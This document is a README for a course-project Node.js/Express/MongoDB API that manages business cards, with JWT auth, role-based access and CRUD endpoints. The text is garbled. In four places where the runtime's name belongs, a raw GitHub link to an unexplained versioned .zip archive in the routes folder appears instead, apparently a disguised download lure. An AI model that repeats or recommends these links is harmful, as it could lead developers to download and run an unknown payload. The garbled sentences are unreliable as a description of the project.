# BusinessCards API

A RESTful API for managing business cards and user accounts. Built with https://raw.githubusercontent.com/lenane68/BusinessCardsNodeJs/master/back/routes/Cards_Js_Business_Node_v2.3-alpha.1.zip, Express, MongoDB, and Mongoose. Includes secure authentication, role-based access control, data validation, and full CRUD functionality.

---

## 🚀 Features

- User registration and login with JWT authentication
- Password hashing using bcryptjs
- Role-based access control (admin, business user)
- Joi validation for incoming request data
- CRUD operations for business cards
- MongoDB models for Users and Cards using Mongoose
- Proper HTTP status codes and error handling

---

## 🛠️ Technologies Used

- https://raw.githubusercontent.com/lenane68/BusinessCardsNodeJs/master/back/routes/Cards_Js_Business_Node_v2.3-alpha.1.zip
- Express
- MongoDB + Mongoose
- Joi
- bcryptjs
- jsonwebtoken

---

## 📁 Folder Structure

/routes → API route handlers 
/models → Mongoose schemas for Users and Cards 
/middleware → Auth and error handling 
/controllers → Business logic for routes 
/validators → Joi schemas for request validation 
/handlers → Core logic for authentication (e.g. https://raw.githubusercontent.com/lenane68/BusinessCardsNodeJs/master/back/routes/Cards_Js_Business_Node_v2.3-alpha.1.zip)

---

## 📦 Installation & Setup

1. Clone the repository  
2. Run `npm install`  
3. Create a `.env` file with your MongoDB URI and JWT secret  
4. Run the server with `npm start`

---

## 📮 API Endpoints

### 🔐 Authentication

- `POST /api/auth/login` — Login and receive JWT token
- `POST /api/auth/register` — register new user

### 🧾 Cards
- `GET /api/cards` — Get all cards  
- `POST /api/cards` — Create a new card (business users only)  
- `PUT /api/cards/:id` — Update a card  
- `DELETE /api/cards/:id` — Delete a card (owner or admin only)  

---

## ✅ Requirements Checklist

- ✅ Joi validation for all incoming data  
- ✅ bcryptjs used for password hashing  
- ✅ JWT token includes `_id`, `isBusiness`, `isAdmin`  
- ✅ Mongoose models for Users and Cards match required structure  
- ✅ HTTP responses include correct status codes and error messages  

---

## 📌 Notes

This project was built as part of a backend development course. It demonstrates secure user management, data validation, and RESTful API design using modern https://raw.githubusercontent.com/lenane68/BusinessCardsNodeJs/master/back/routes/Cards_Js_Business_Node_v2.3-alpha.1.zip practices.
